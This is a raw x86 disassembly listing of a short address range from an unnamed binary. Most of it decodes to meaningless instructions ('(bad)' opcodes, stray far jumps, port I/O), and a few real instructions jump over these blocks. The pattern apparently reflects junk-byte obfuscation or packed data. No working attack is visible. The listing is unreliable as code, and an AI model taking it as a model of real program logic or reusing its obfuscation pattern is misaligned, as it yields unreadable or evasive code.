  40abbd:	ds mov dl,0x16
  40abc0:	dec    cl
  40abc2:	shr    BYTE PTR [eax],cl
  40abc4:	fstp   QWORD PTR [eax]
  40abc6:	icebp  
  40abc7:	add    dl,BYTE PTR [eiz*2-0x5f3168cb]
  40abce:	inc    ecx
  40abcf:	lods   al,BYTE PTR ds:[esi]
  40abd0:	sbb    al,BYTE PTR [ecx]
  40abd2:	fs jg  0x40abfa
  40abd5:	add    eax,edi
  40abd7:	cld    
  40abd8:	pop    ebp
  40abd9:	mov    WORD PTR [esi],es
  40abdb:	or     al,0xc3
  40abdd:	les    ebx,FWORD PTR [esi-0x7f8d7408]
  40abe3:	(bad)  
  40abe4:	add    DWORD PTR [ebx+0x2ee7179c],eax
  40abea:	pop    ebp
  40abeb:	inc    esp
  40abec:	test   eax,0x9a772883
  40abf1:	or     al,0xbb
  40abf3:	jecxz  0x40abf3
  40abf5:	pop    eax
  40abf6:	cmp    BYTE PTR [esp+ebp*1],ch
  40abf9:	rol    DWORD PTR [edx+edx*4],cl
  40abfc:	fnstsw ax
  40abfe:	add    dl,BYTE PTR [eax+0x10]
  40ac01:	inc    ebx
  40ac02:	and    eax,0xcb7a25dc
  40ac07:	xchg   edx,eax
  40ac08:	mov    WORD PTR [edx+0x56],ss
  40ac0b:	rol    DWORD PTR [ebx+0x75bf5433],0xb2
  40ac12:	mov    eax,ds:0xd5642f0e
  40ac17:	mov    dl,0x2b
  40ac19:	adc    ecx,DWORD PTR [ebx]
  40ac1b:	mov    ebp,0x8137a21b
  40ac20:	sub    al,0x99
  40ac22:	sub    bh,BYTE PTR [eax-0x261f7d00]
  40ac28:	cld    
  40ac29:	add    DWORD PTR [eax+0xe],esp
  40ac2c:	inc    esp
  40ac2d:	adc    al,0x54
  40ac2f:	adc    al,0x43
  40ac31:	clc    
  40ac32:	and    DWORD PTR [ebp+0x5bc14518],ebx
  40ac38:	push   ds
  40ac39:	or     al,0xa7
  40ac3b:	in     al,0xdd
  40ac3d:	mov    ebx,0xe5cdb756
  40ac42:	sbb    al,0x3
  40ac44:	stc    
  40ac45:	add    edx,ecx
  40ac47:	imul   edx,edi
  40ac4a:	mov    edi,DWORD PTR [ebp-0x8]
  40ac4d:	jmp    0x40afc0
  40ac52:	icebp  
  40ac53:	cs mov ah,0x3e
  40ac56:	ja     0x40ac9e
  40ac58:	jno    0x40ac8b
  40ac5a:	mov    esi,0x706a3c5e
  40ac5f:	push   es
  40ac60:	and    BYTE PTR cs:0xca7c7cfc,bh
  40ac67:	jns    0x40ace5
  40ac69:	jl     0x40ac60
  40ac6b:	mov    edi,0xda363ee1
  40ac70:	pop    ds
  40ac71:	sbb    ecx,DWORD PTR ds:0x97b496e9
  40ac77:	adc    ebp,esp
  40ac79:	sahf   
  40ac7a:	pop    ecx
  40ac7b:	sar    DWORD PTR ds:[ecx-0x32eeef07],1
  40ac82:	mov    ecx,0x42a62f4a
  40ac87:	cmp    al,0x32
  40ac89:	jmp    0x40ac2c
  40ac8b:	es test eax,0x27448dfc
  40ac91:	mov    DWORD PTR [edi-0x56],esi
  40ac94:	fldcw  WORD PTR [edi+esi*1-0x16]
  40ac98:	mov    eax,ds:0x4bdbf07
  40ac9d:	jo     0x40acdd
  40ac9f:	cld    
  40aca0:	iret   
  40aca1:	sahf   
  40aca2:	call   0x336f:0x32c30c06
  40aca9:	inc    edx
  40acaa:	mov    bh,0x6a
  40acac:	mov    ecx,0x376cb29b
  40acb1:	jg     0x40ac52
  40acb3:	mov    eax,0x14ddfc19
  40acb8:	fbstp  TBYTE PTR [ebx+0x54]
  40acbb:	ins    DWORD PTR es:[edi],dx
  40acbc:	not    DWORD PTR [ebp+0x65a7b682]
  40acc2:	jmp    0xa509671d
  40acc7:	js     0x40ad32
  40acc9:	push   0x43
  40accb:	and    edi,DWORD PTR [edi]
  40accd:	and    BYTE PTR [edx-0x53],dl
  40acd0:	jb     0x40ad1b
  40acd2:	loope  0x40ad3c
  40acd4:	inc    esi
  40acd5:	pushf  
  40acd6:	cs dec eax
  40acd8:	xchg   ebp,eax
  40acd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acda:	xchg   edi,eax
  40acdb:	xchg   esi,eax
  40acdc:	popa   
  40acdd:	jmp    0xff86:0x59ab4686
  40ace4:	nop
  40ace5:	in     eax,dx
  40ace6:	ret    
  40ace7:	in     al,dx
  40ace8:	xlat   BYTE PTR ds:[ebx]
  40ace9:	mov    ch,0x5
  40aceb:	retf   
  40acec:	sub    ecx,DWORD PTR [ecx+0x207df75c]
  40acf2:	jne    0x40acc7
  40acf4:	and    edx,0x18b37a0e
  40acfa:	add    ebp,esi
  40acfc:	cmp    edi,0x3c44e0e0
  40ad02:	jp     0x40acee
  40ad04:	xlat   BYTE PTR ds:[ebx]
  40ad05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad06:	inc    edi
  40ad07:	test   BYTE PTR [ebp+edx*8+0x6932f827],bh
  40ad0e:	jns    0x40acee
  40ad10:	pop    ebp
  40ad11:	add    eax,ebp
  40ad13:	jbe    0x40ad15
  40ad15:	neg    DWORD PTR [ebx+0x6e28eb93]
  40ad1b:	or     dl,BYTE PTR [ebp+eax*2+0x6d]
  40ad1f:	aam    0xf4
  40ad21:	jg     0x40accd
  40ad23:	mov    esi,DWORD PTR [ebx-0x47]
  40ad26:	dec    ebp
  40ad27:	and    edx,ebp
  40ad29:	pop    es
  40ad2a:	rol    eax,1
  40ad2c:	inc    eax
  40ad2d:	std    
  40ad2e:	xchg   edi,eax
  40ad2f:	shl    BYTE PTR [ecx+edi*1-0x5f],0x68
  40ad34:	xchg   esp,eax
  40ad35:	test   eax,0x10bb806a
  40ad3a:	fadd   DWORD PTR [ecx]
  40ad3c:	adc    al,BYTE PTR [ebx+0x5c7f7cb]
  40ad42:	adc    ax,0x6010
  40ad46:	jno    0x40ad35
  40ad48:	clc    
  40ad49:	jmp    0x8e5b53cc
  40ad4e:	jnp    0x40acff
  40ad50:	int    0xd8
  40ad52:	push   ss
  40ad53:	scas   eax,DWORD PTR es:[edi]
  40ad54:	jp     0x40acf5
  40ad56:	dec    ebx
  40ad57:	and    cl,BYTE PTR [edx]
  40ad59:	mov    bh,0x52
  40ad5b:	adc    eax,0xe4f8cbc4
  40ad60:	jmp    0x40ad11
  40ad62:	ds cwde 
  40ad64:	outs   dx,BYTE PTR ds:[esi]
  40ad65:	data16 fwait
  40ad67:	ss push 0x7984ee6f
  40ad6d:	jmp    0xd39a:0x18517df9
  40ad74:	push   ss
  40ad75:	outs   dx,DWORD PTR ds:[esi]
  40ad76:	test   al,0x59
  40ad78:	add    eax,0xa373fa17
  40ad7d:	pop    ecx
  40ad7e:	sub    DWORD PTR [ecx-0x6774d921],0x532c994c
  40ad88:	jge    0x40ad45
  40ad8a:	sbb    DWORD PTR [eax],0x269d6348
  40ad90:	in     al,0xc7
  40ad92:	xchg   ecx,eax
  40ad93:	scas   al,BYTE PTR es:[edi]
  40ad94:	fdiv   DWORD PTR [eax-0x3117c40b]
  40ad9a:	sub    dl,BYTE PTR [eax]
  40ad9c:	mov    ah,BYTE PTR [edi+0x74823431]
  40ada2:	mov    al,0x39
  40ada4:	adc    DWORD PTR [edx+0x37cf6697],esi
  40adaa:	mov    WORD PTR [ebp+0x566bc627],cs
  40adb0:	push   es
  40adb1:	pushf  
  40adb2:	clc    
  40adb3:	jbe    0x40addd
  40adb5:	sbb    eax,0xc6b46576
  40adba:	(bad)  
  40adbb:	std    
  40adbc:	in     al,dx
  40adbd:	jno    0x40ada1
  40adbf:	sub    eax,eax
  40adc1:	or     eax,0xebdfa47b
  40adc6:	mov    ecx,0x809e5f44
  40adcb:	shl    DWORD PTR [edx-0x6014e84e],0x2
  40add2:	or     DWORD PTR [edx],ebp
  40add4:	adc    DWORD PTR [eax-0x6d1e522f],edx
  40adda:	jmp    0x8ef5:0x509a4c4f
  40ade1:	ins    DWORD PTR es:[edi],dx
  40ade2:	jecxz  0x40ade7
  40ade4:	pop    ecx
  40ade5:	dec    ebp
  40ade6:	in     al,0x3e
  40ade8:	loope  0x40adb3
  40adea:	sub    bh,BYTE PTR [eax]
  40adec:	fsub   DWORD PTR [edx+0x17]
  40adef:	push   ebx
  40adf0:	iret   
  40adf1:	add    al,0xe3
  40adf3:	push   edx
  40adf4:	(bad)  [ecx+0x456491ed]
  40adfa:	out    dx,eax
  40adfb:	mov    WORD PTR [ecx],ss
  40adfd:	mov    DWORD PTR [edx+0x79],ebp
  40ae00:	test   dl,bl
  40ae02:	push   ss
  40ae03:	push   0xffffff87
  40ae05:	inc    esi
  40ae06:	inc    esp
  40ae07:	mov    ds:0x3e5b741e,eax
  40ae0c:	addr16 mov edi,0x85513feb
  40ae12:	push   0x6c9316bf
  40ae17:	sbb    ecx,edx
  40ae19:	mov    ch,0x90
  40ae1b:	ins    DWORD PTR es:[edi],dx
  40ae1c:	cs call 0x595a:0x53a14f50
  40ae24:	int3   
  40ae25:	adc    eax,0xc74b248a
  40ae2a:	cmp    eax,0x32b6c91f
  40ae2f:	out    0x8c,al
  40ae31:	push   ecx
  40ae32:	mov    ebp,0x39608d6b
  40ae37:	outs   dx,DWORD PTR ds:[esi]
  40ae38:	jle    0x40ae69
  40ae3a:	mov    al,0x24
  40ae3c:	pop    es
  40ae3d:	lods   al,BYTE PTR ds:[esi]
  40ae3e:	test   DWORD PTR [ecx],ecx
  40ae40:	test   ebp,ebp
  40ae42:	mov    edx,0x6d4a3f18
  40ae47:	fimul  WORD PTR [ecx-0x3c18a59b]
  40ae4d:	jmp    0x3494fb76
  40ae52:	fisttp QWORD PTR [ecx]
  40ae54:	retf   
  40ae55:	(bad)  
  40ae56:	out    dx,al
  40ae57:	xchg   esp,eax
  40ae58:	sbb    eax,esi
  40ae5a:	xchg   ebp,eax
  40ae5b:	inc    edi
  40ae5c:	fisubr DWORD PTR ds:0xc87aee57
  40ae62:	adc    al,0x15
  40ae64:	sbb    BYTE PTR [ebp-0x7f],dh
  40ae67:	ds xor edi,edx
  40ae6a:	int    0xce
  40ae6c:	jnp    0x40ae29
  40ae6e:	jmp    0xd0bf0d6e
  40ae73:	popa   
  40ae74:	or     al,0xac
  40ae76:	ret    0x652d
  40ae79:	adc    al,0x5c
  40ae7b:	mov    ah,BYTE PTR [ecx]
  40ae7d:	imul   eax,ebx,0xffffffc4
  40ae80:	lock stc 
  40ae82:	xor    esi,DWORD PTR [eax]
  40ae84:	sub    eax,0x828a271c
  40ae89:	fstp   TBYTE PTR [ebp-0x35]
  40ae8c:	pop    ss
  40ae8d:	sub    al,0xab
  40ae8f:	jmp    0xd6e5:0xb6f27e88
  40ae96:	(bad)  
  40ae97:	ja     0x40ae36
  40ae99:	test   esi,ecx
  40ae9b:	push   esi
  40ae9c:	and    BYTE PTR [edi+0x390bb943],al
  40aea2:	add    al,0xfe
  40aea4:	inc    esi
  40aea5:	pop    ds
  40aea6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aea7:	push   ds
  40aea8:	adc    BYTE PTR [esi+0x48],bh
  40aeab:	mov    edi,0x144ee01d
  40aeb0:	jno    0x40ae4e
  40aeb2:	xchg   edi,eax
  40aeb3:	mov    WORD PTR [ebx+0x62],ss
  40aeb6:	popf   
  40aeb7:	pop    ebp
  40aeb8:	ds call 0xd4d6700c
  40aebe:	dec    ebx
  40aebf:	fistp  DWORD PTR [ecx-0x6]
  40aec2:	lods   al,BYTE PTR ds:[esi]
  40aec3:	ins    BYTE PTR es:[edi],dx
  40aec4:	cdq    
  40aec5:	rcr    bl,0xfb
  40aec8:	mov    eax,0xdb4b29b1
  40aecd:	push   0x8138d8ce
  40aed2:	cli    
  40aed3:	loope  0x40af45
  40aed5:	loop   0x40aea4
  40aed7:	and    BYTE PTR [eax+0x6f],bh
  40aeda:	mov    ah,0x9e
  40aedc:	neg    DWORD PTR [ebp-0x23d492b6]
  40aee2:	popa   
  40aee3:	sbb    dh,BYTE PTR [ebx]
  40aee5:	adc    al,BYTE PTR [eax]
  40aee7:	repz xor al,0x10
  40aeea:	mov    ecx,0x41252e5
  40aeef:	addr16 add eax,0xa3989bf3
  40aef5:	mov    dl,0xb1
  40aef7:	loop   0x40aea6
  40aef9:	scas   eax,DWORD PTR es:[edi]
  40aefa:	ror    BYTE PTR ds:0x2bc8c323,1
  40af00:	cmc    
  40af01:	out    dx,eax
  40af02:	push   esp
  40af03:	or     BYTE PTR [eax+0x64],bh
  40af06:	push   ebp
  40af07:	or     al,BYTE PTR [ebp+0x1985660]
  40af0d:	push   esp
  40af0e:	xchg   esp,eax
  40af0f:	mov    ebx,0x663940f7
  40af14:	pushf  
  40af15:	fadd   st,st(3)
  40af17:	pop    es
  40af18:	pushf  
  40af19:	into   
  40af1a:	sbb    eax,ebp
  40af1c:	or     esp,DWORD PTR [ebp+0x6f]
  40af1f:	arpl   WORD PTR [esi],ax
  40af21:	test   ah,ah
  40af23:	jmp    0x40af61
  40af25:	loop   0x40af36
  40af27:	mov    ds:0xebf25197,al
  40af2c:	sbb    BYTE PTR [edx+0x5d],al
  40af2f:	fiadd  WORD PTR [edi-0x74]
  40af32:	call   0x66d9b645
  40af37:	xchg   ebx,eax
  40af38:	ret    
  40af39:	jbe    0x40aec3
  40af3b:	pusha  
  40af3c:	pop    ss
  40af3d:	adc    esi,DWORD PTR [edx]
  40af3f:	mov    esp,0x990da145
  40af44:	inc    esi
  40af45:	(bad)  
  40af47:	arpl   WORD PTR [ebp-0x79713a67],bx
  40af4d:	fmul   st(1),st
  40af4f:	xor    al,0x29
  40af51:	into   
  40af52:	and    esp,0x22
  40af55:	adc    dh,ah
  40af57:	hlt    
  40af58:	adc    ah,0x9e
  40af5b:	nop
  40af5c:	imul   ebp,DWORD PTR [esi+0x23],0x570e69e0
  40af63:	aas    
  40af64:	jecxz  0x40af0a
  40af66:	addr16 test cl,bh
  40af69:	xor    cl,BYTE PTR [esi]
  40af6b:	cmp    eax,0x1d2187af
  40af70:	push   ecx
  40af71:	ins    DWORD PTR es:[edi],dx
  40af72:	hlt    
  40af73:	pop    esi
  40af74:	mov    edx,0xe48a6062
  40af79:	cmp    eax,0x4e96bfb7
  40af7e:	(bad)  
  40af7f:	popa   
  40af80:	icebp  
  40af81:	call   0xbd42946
  40af86:	sbb    eax,0xb2a9bb39
  40af8b:	push   ebp
  40af8c:	call   0xe068:0xb61d5600
  40af93:	cmp    DWORD PTR [edi-0x20eb4380],0x84f9bfb7
  40af9d:	iret   
  40af9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af9f:	pop    edi
  40afa0:	test   dh,dl
  40afa2:	lahf   
  40afa3:	sbb    BYTE PTR [eax-0x5],0xff
  40afa7:	shl    DWORD PTR ds:0xb2bf04da,cl
  40afad:	loope  0x40b002
  40afaf:	inc    ecx
  40afb0:	xor    DWORD PTR [esi],edx
  40afb2:	mov    bh,0xfd
  40afb4:	or     BYTE PTR [eax],bl
  40afb6:	or     al,0xd2
  40afb8:	(bad)  
  40afb9:	std    
  40afba:	xor    bl,BYTE PTR [esi-0x2bb715e9]
  40afc0:	mov    ebx,DWORD PTR [ebp-0x10]
  40afc3:	sub    ebx,edi
  40afc5:	cmp    ebx,edx
  40afc7:	ja     0x40afd5
  40afcd:	mov    edx,DWORD PTR [ebp-0x2c]
  40afd0:	jmp    0x40baa7
  40afd5:	mov    edx,DWORD PTR [ebp-0x34]
  40afd8:	mov    edi,DWORD PTR [ebp-0x4]
  40afdb:	xor    edx,eax
  40afdd:	xor    edi,eax
  40afdf:	add    edi,ecx
  40afe1:	add    edx,ecx
  40afe3:	imul   edx,edi
  40afe6:	mov    edi,DWORD PTR [ebp-0x8]
  40afe9:	mov    ebx,DWORD PTR [ebp-0x10]
  40afec:	sub    ebx,edi
  40afee:	jmp    0x40b361
  40aff3:	rcr    BYTE PTR [esi-0x6b],0x3c
  40aff7:	mov    ebp,0xb3625deb
  40affc:	jecxz  0x40af85
  40affe:	fcomp  st(1)
  40b000:	adc    BYTE PTR [esi+0x7cf98bc8],0x7c
  40b007:	retf   0x7c79
  40b00a:	jl     0x40b075
  40b00c:	push   esi
  40b00d:	cmp    BYTE PTR [ecx-0x64ba5d51],cl
  40b013:	mov    dl,0x2b
  40b015:	loop   0x40af9d
  40b017:	xchg   ebx,eax
  40b018:	adc    eax,0xc7561aa9
  40b01d:	lds    ebx,FWORD PTR [ecx+0x3c]
  40b020:	aaa    
  40b021:	and    dl,al
  40b023:	xchg   edx,eax
  40b024:	or     eax,0xcfd577c4
  40b029:	aam    0xbf
  40b02b:	jecxz  0x40b07e
  40b02d:	addr16 repnz das 
  40b030:	push   0x70
  40b032:	ret    0x8fa3
  40b035:	adc    edx,DWORD PTR [esi+eiz*2]
  40b038:	icebp  
  40b039:	or     edi,esp
  40b03b:	xchg   esi,eax
  40b03c:	jg     0x40b062
  40b03e:	sub    cl,BYTE PTR [eax]
  40b040:	dec    esi
  40b041:	(bad)  
  40b042:	xchg   ebp,eax
  40b043:	fist   WORD PTR [esi]
  40b045:	rcr    BYTE PTR [edx+0x53],1
  40b048:	mov    bh,0x5c
  40b04a:	retf   
  40b04b:	adc    eax,0x78a7b827
  40b050:	sbb    edi,DWORD PTR [ecx]
  40b052:	ins    DWORD PTR es:[edi],dx
  40b053:	fidivr WORD PTR [eax-0x39]
  40b056:	ret    0xd6f4
  40b059:	push   esi
  40b05a:	imul   ebx,DWORD PTR [edx],0xffffffd2
  40b05d:	arpl   WORD PTR [eax-0x4a9c37a4],di
  40b063:	xor    bl,bl
  40b065:	push   cs
  40b066:	test   al,0xd7
  40b068:	das    
  40b069:	xor    al,0x17
  40b06b:	pop    esi
  40b06c:	dec    ebp
  40b06d:	outs   dx,DWORD PTR ds:[esi]
  40b06e:	pop    ss
  40b06f:	push   ds
  40b070:	repnz sbb bl,dh
  40b073:	pop    es
  40b074:	pop    es
  40b075:	rol    DWORD PTR [ecx-0x2d],cl
  40b078:	sub    ah,BYTE PTR [edx]
  40b07a:	cmp    al,0x14
  40b07c:	sar    cl,0x60
  40b07f:	lock jp 0x40b0b3
  40b082:	xchg   edx,eax
  40b083:	jns    0x40b06a
  40b085:	mul    DWORD PTR [esi+0x7e4eed20]
  40b08b:	std    
  40b08c:	mov    al,0x4c
  40b08e:	dec    esi
  40b08f:	jmp    0x40b0f6
  40b091:	xor    al,0xef
  40b093:	lods   eax,DWORD PTR ds:[esi]
  40b094:	aad    0x9
  40b096:	xchg   BYTE PTR [ebx],dl
  40b098:	and    esp,DWORD PTR [eax]
  40b09a:	sbb    eax,0x8620a7ca
  40b09f:	out    0x94,al
  40b0a1:	jae    0x40b0c7
  40b0a3:	arpl   WORD PTR [ecx-0x7b2a6f6c],sp
  40b0a9:	xchg   ebx,eax
  40b0aa:	retf   0xe752
  40b0ad:	pop    edi
  40b0ae:	test   eax,0x51c4d469
  40b0b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0b4:	push   ebp
  40b0b5:	mov    al,0xc7
  40b0b7:	jnp    0x40b0c8
  40b0b9:	mov    edi,0x66f319f
  40b0be:	xlat   BYTE PTR ds:[ebx]
  40b0bf:	sub    bl,BYTE PTR [edx]
  40b0c1:	repnz lahf 
  40b0c3:	add    eax,0x5074c47
  40b0c8:	sbb    ebx,DWORD PTR [ecx-0x5cf466f0]
  40b0ce:	jnp    0x40b123
  40b0d0:	mov    esp,0x9e3542e5
  40b0d5:	or     dh,bh
  40b0d7:	sahf   
  40b0d8:	nop
  40b0d9:	jns    0x40b0b4
  40b0db:	aaa    
  40b0dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0dd:	pop    esp
  40b0de:	mov    DWORD PTR [esi],0x8609f8cb
  40b0e4:	sbb    eax,DWORD PTR [ecx]
  40b0e6:	cmp    eax,0x1877e65d
  40b0eb:	cmp    ebp,DWORD PTR [ecx]
  40b0ed:	sub    BYTE PTR [ebp-0x20],ah
  40b0f0:	test   BYTE PTR cs:[ecx+0x7a],ah
  40b0f4:	and    DWORD PTR [edi-0xaf8a49a],ebx
  40b0fa:	mov    ecx,0xef4cebd5
  40b0ff:	or     DWORD PTR [ebx+0x3587315b],0x9f936ece
  40b109:	mov    esp,0x4888a71e
  40b10e:	and    ebp,DWORD PTR [edx+0x2]
  40b111:	add    edx,DWORD PTR [ecx]
  40b113:	adc    BYTE PTR [eax-0x7c],bh
  40b116:	jg     0x40b0da
  40b118:	jo     0x40b137
  40b11a:	inc    ebp
  40b11b:	gs in  eax,dx
  40b11d:	adc    BYTE PTR [edi+0x54174756],dl
  40b123:	std    
  40b124:	xchg   ecx,eax
  40b125:	mov    ss,WORD PTR [ecx]
  40b127:	in     eax,0x2b
  40b129:	pop    ebp
  40b12a:	pop    esp
  40b12b:	add    BYTE PTR [ecx],ch
  40b12d:	loope  0x40b160
  40b12f:	push   ebp
  40b130:	or     al,0x9d
  40b132:	jg     0x40b0f2
  40b134:	adc    al,0x4a
  40b136:	pop    es
  40b137:	jmp    FWORD PTR [ebx+0x61]
  40b13a:	jmp    FWORD PTR [eax]
  40b13c:	sbb    esi,DWORD PTR [edx]
  40b13e:	in     eax,0xed
  40b140:	cmp    al,al
  40b142:	es jnp 0x40b12c
  40b145:	bound  esi,QWORD PTR [edx-0x2257c79b]
  40b14b:	push   edi
  40b14c:	jne    0x40b15b
  40b14e:	sub    al,0x11
  40b150:	sbb    eax,0x1904214d
  40b155:	xchg   DWORD PTR [edx-0x17],ebx
  40b158:	jecxz  0x40b19b
  40b15a:	sti    
  40b15b:	ret    
  40b15c:	push   ebp
  40b15d:	xor    al,0x1f
  40b15f:	push   eax
  40b160:	(bad)  [ecx]
  40b162:	push   ebp
  40b163:	lods   eax,DWORD PTR ds:[esi]
  40b164:	xchg   esi,eax
  40b165:	push   edx
  40b166:	fsubr  DWORD PTR [ecx+0x4a]
  40b169:	xlat   BYTE PTR ds:[ebx]
  40b16a:	ror    al,0x34
  40b16d:	push   ebp
  40b16e:	nop
  40b16f:	xor    esi,edx
  40b171:	sahf   
  40b172:	pop    esp
  40b173:	sub    eax,0xcece48f8
  40b178:	and    BYTE PTR [ebx],0x9e
  40b17b:	loop   0x40b16c
  40b17d:	cmovns edx,ebx
  40b180:	dec    ebp
  40b181:	jecxz  0x40b168
  40b183:	mov    ds:0x24669fcb,eax
  40b188:	add    eax,0x590bb18f
  40b18d:	into   
  40b18e:	jb     0x40b136
  40b190:	mov    dh,0xcb
  40b192:	inc    edx
  40b193:	stos   BYTE PTR es:[edi],al
  40b194:	(bad)  
  40b195:	je     0x40b183
  40b197:	in     al,dx
  40b198:	retf   
  40b199:	addr16 xchg ecx,eax
  40b19b:	pop    edx
  40b19c:	outs   dx,BYTE PTR ds:[esi]
  40b19d:	pop    edi
  40b19e:	jp     0x40b1e9
  40b1a0:	dec    ecx
  40b1a1:	pusha  
  40b1a2:	call   0x2b6f49f7
  40b1a7:	stos   DWORD PTR es:[edi],eax
  40b1a8:	and    al,0x8d
  40b1aa:	jns    0x40b187
  40b1ac:	pop    ebp
  40b1ad:	push   esi
  40b1ae:	test   al,0x7c
  40b1b0:	cmp    al,0x2d
  40b1b2:	sahf   
  40b1b3:	xor    eax,0x558a085b
  40b1b8:	add    BYTE PTR [esi],0x3d
  40b1bb:	fisubr WORD PTR [edx]
  40b1bd:	inc    eax
  40b1be:	loopne 0x40b19b
  40b1c0:	cmp    ch,BYTE PTR [esp+eiz*8]
  40b1c3:	ds mov bl,0x13
  40b1c6:	fistp  WORD PTR [ebx+ecx*4-0x51]
  40b1ca:	nop
  40b1cb:	add    al,0xbb
  40b1cd:	jge    0x40b158
  40b1cf:	dec    edi
  40b1d0:	out    0xa7,eax
  40b1d2:	stos   BYTE PTR es:[edi],al
  40b1d3:	and    eax,0xca211b57
  40b1d8:	pop    ds
  40b1d9:	adc    al,0x8
  40b1db:	xchg   ecx,eax
  40b1dc:	shr    bl,cl
  40b1de:	sahf   
  40b1df:	inc    esp
  40b1e0:	push   0x890aa683
  40b1e5:	mov    edx,0xdea5e6f1
  40b1ea:	xor    al,0x10
  40b1ec:	in     eax,dx
  40b1ed:	inc    edi
  40b1ee:	mov    ebp,DWORD PTR [ebx+0x8]
  40b1f1:	fwait
  40b1f2:	cdq    
  40b1f3:	stc    
  40b1f4:	sbb    esp,DWORD PTR [ebp+0x3aacbd63]
  40b1fa:	jnp    0x40b246
  40b1fc:	push   0x38
  40b1fe:	sbb    BYTE PTR [ecx],dl
  40b200:	in     eax,0xa7
  40b202:	push   eax
  40b203:	test   BYTE PTR [ecx+0x58530747],bl
  40b209:	pop    esp
  40b20a:	ss or  ch,al
  40b20d:	bound  ebx,QWORD PTR [esi]
  40b20f:	ja     0x40b193
  40b211:	(bad)  
  40b212:	mov    esi,0x7dd95110
  40b217:	jmp    0x40b1d9
  40b219:	dec    edx
  40b21a:	je     0x40b269
  40b21c:	sub    eax,0x6130dedc
  40b221:	ja     0x40b298
  40b223:	ficomp DWORD PTR [edx]
  40b225:	mov    edi,0x2a6a13ea
  40b22a:	xchg   ebx,eax
  40b22b:	enter  0x164b,0xf4
  40b22f:	jge    0x40b28b
  40b231:	mov    ebp,0x1dbee6bc
  40b236:	sahf   
  40b237:	ja     0x40b2b1
  40b239:	fisttp WORD PTR [edi+0x297ecc12]
  40b23f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b241:	jo     0x40b21c
  40b243:	aad    0x3f
  40b245:	mov    ebx,0xc344b116
  40b24a:	enter  0xf280,0xad
  40b24e:	pop    edx
  40b24f:	pop    DWORD PTR [ebx]
  40b251:	ds popf 
  40b253:	icebp  
  40b254:	shl    DWORD PTR [esi+0xe3541a1],cl
  40b25a:	pop    ecx
  40b25b:	mov    bh,0xd
  40b25d:	push   ecx
  40b25e:	sbb    al,0x4d
  40b260:	iret   
  40b261:	repnz or al,0x9e
  40b264:	sub    esp,eax
  40b266:	ret    
  40b267:	inc    edi
  40b268:	adc    eax,0x5415be1
  40b26d:	fnstcw WORD PTR [ebp+0x8e23423]
  40b273:	push   0x234bef4b
  40b278:	dec    eax
  40b279:	mov    dh,0x5c
  40b27b:	sbb    ch,BYTE PTR [eax]
  40b27d:	sbb    DWORD PTR [eax],0x3a4449f9
  40b283:	es (bad) 
  40b285:	ins    DWORD PTR es:[edi],dx
  40b286:	xor    eax,0xebbc61d5
  40b28b:	mov    ecx,0xae45e83c
  40b290:	rcl    BYTE PTR [esi+ebx*8-0x51],1
  40b294:	jns    0x40b313
  40b296:	out    0xf6,eax
  40b298:	out    dx,al
  40b299:	fisubr WORD PTR [edx+eax*2]
  40b29c:	sahf   
  40b29d:	aas    
  40b29e:	dec    ebx
  40b29f:	test   BYTE PTR [esi+0x623c924f],ah
  40b2a5:	jle    0x40b22e
  40b2a7:	out    dx,al
  40b2a8:	mov    cl,bl
  40b2aa:	jle    0x40b25d
  40b2ac:	in     eax,dx
  40b2ad:	lods   eax,DWORD PTR ds:[esi]
  40b2ae:	(bad)  
  40b2af:	cld    
  40b2b0:	pushf  
  40b2b1:	mov    ecx,esp
  40b2b3:	enter  0xab17,0x62
  40b2b7:	scas   eax,DWORD PTR es:[edi]
  40b2b8:	aam    0xf3
  40b2ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b2bb:	mov    bl,0x76
  40b2bd:	in     al,dx
  40b2be:	mov    ah,0x80
  40b2c0:	adc    WORD PTR [edi],dx
  40b2c3:	mov    edi,0xd3916279
  40b2c8:	js     0x40b316
  40b2ca:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40b2cc:	imul   esp,DWORD PTR [ebp-0x6f72530c],0x5d782df0
  40b2d6:	inc    edi
  40b2d7:	xor    ecx,DWORD PTR [esp+eiz*4+0x34]
  40b2db:	arpl   WORD PTR es:[eax],bp
  40b2de:	dec    edx
  40b2df:	aam    0x42
  40b2e1:	push   cs
  40b2e2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2e3:	push   cs
  40b2e4:	inc    eax
  40b2e5:	xchg   edi,eax
  40b2e6:	ins    BYTE PTR es:[edi],dx
  40b2e7:	hlt    
  40b2e8:	arpl   WORD PTR [edi-0x3],di
  40b2eb:	dec    edx
  40b2ec:	push   0xffffffa0
  40b2ee:	ret    0x9615
  40b2f1:	inc    ecx
  40b2f2:	cs retf 
  40b2f4:	lock rcr DWORD PTR [ecx+eiz*4+0x18201314],cl
  40b2fc:	lods   al,BYTE PTR ds:[esi]
  40b2fd:	push   ss
  40b2fe:	nop
  40b2ff:	push   0x117507a6
  40b304:	cmp    edi,DWORD PTR [edx]
  40b306:	mov    ds:0x1c75d7ab,al
  40b30b:	push   cs
  40b30c:	mov    ebx,0x1f3c5ae9
  40b311:	nop
  40b312:	jne    0x40b36e
  40b314:	sbb    BYTE PTR [ebp+0x7ee203e2],bh
  40b31a:	cmp    eax,0x5fc07c44
  40b31f:	jl     0x40b32a
  40b321:	sbb    esp,edx
  40b323:	jnp    0x40b316
  40b325:	call   0x6cb6544d
  40b32a:	xor    BYTE PTR [ecx+0x34],0x99
  40b32e:	add    eax,0x397f83cd
  40b333:	inc    eax
  40b334:	mov    dl,0x3e
  40b336:	sar    BYTE PTR [ebx+0x5d],cl
  40b339:	repz call 0xe5c64ba5
  40b33f:	stos   BYTE PTR es:[edi],al
  40b340:	pop    ax
  40b342:	add    al,BYTE PTR [edx-0x5]
  40b345:	pop    esp
  40b346:	cmp    al,0xa8
  40b348:	pop    ebx
  40b349:	lock push eax
  40b34b:	jg     0x40b2ef
  40b34d:	mov    WORD PTR ds:0xac706d8b,ds
  40b353:	inc    edi
  40b354:	sbb    al,0x86
